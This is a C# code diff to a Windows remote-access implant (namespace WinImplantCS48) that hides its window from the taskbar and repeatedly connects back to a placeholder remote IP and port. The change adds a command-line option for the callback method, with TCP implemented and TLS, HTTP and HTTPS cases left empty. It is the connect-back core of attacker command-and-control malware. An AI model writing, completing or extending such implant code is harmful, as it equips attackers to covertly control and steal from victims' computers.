@@ -21,6 +21,7 @@ namespace WinImplantCS48
         private string[] m_args { get; set; }
         private string m_szIPv4 = "[REMOTE_IP]";
         private int m_nPort = 5000; //int.Parse("[REMOTE_PORT]");
+        private clsLtn.enMethod m_method { get; set; }
 
         private bool m_bIsConnected = false;
 
@@ -430,10 +431,20 @@ namespace WinImplantCS48
             MinimizeBox = true;
             ShowInTaskbar = false;
 
-            if (m_args.Length == 2)
+            if (m_args.Length >= 2)
             {
                 m_szIPv4 = m_args[0];
                 m_nPort = int.Parse(m_args[1]);
+
+                if (m_args.Length == 3)
+                {
+                    string szMethod = m_args[2].ToUpper();
+                    m_method = (clsLtn.enMethod)Enum.Parse(typeof(clsLtn.enMethod), szMethod);
+                }
+                else
+                {
+                    m_method = clsLtn.enMethod.TCP; //default
+                }
             }
 
             while (true)
@@ -441,7 +452,23 @@ namespace WinImplantCS48
                 try
                 {
                     if (!m_bIsConnected)
-                        fnTcpConnect(m_szIPv4 , m_nPort);
+                    {
+                        switch (m_method)
+                        {
+                            case clsLtn.enMethod.TCP:
+                                fnTcpConnect(m_szIPv4, m_nPort);
+                                break;
+                            case clsLtn.enMethod.TLS:
+
+                                break;
+                            case clsLtn.enMethod.HTTP:
+
+                                break;
+                            case clsLtn.enMethod.HTTPS:
+
+                                break;
+                        }
+                    }
                 }
                 catch (Exception ex)
                 {
